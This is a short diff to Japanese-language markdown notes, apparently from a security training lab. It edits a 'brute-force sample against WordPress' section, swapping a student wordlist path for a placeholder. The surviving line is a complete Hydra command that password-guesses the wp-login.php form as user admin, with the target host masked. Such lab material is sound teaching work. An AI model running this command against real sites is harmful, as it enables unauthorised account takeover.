@@ -29,5 +29,5 @@
 ## wordpressへのブルートフォースサンプル
 
 ``` shell
-    sudo hydra XXXXXX -s 80 -l admin -P /home/student/rockyou_mini.txt http-form-post "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:incorrect"
+    sudo hydra XXXXXX -s 80 -l admin -P <passwordlist> http-form-post "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:incorrect"
 ```
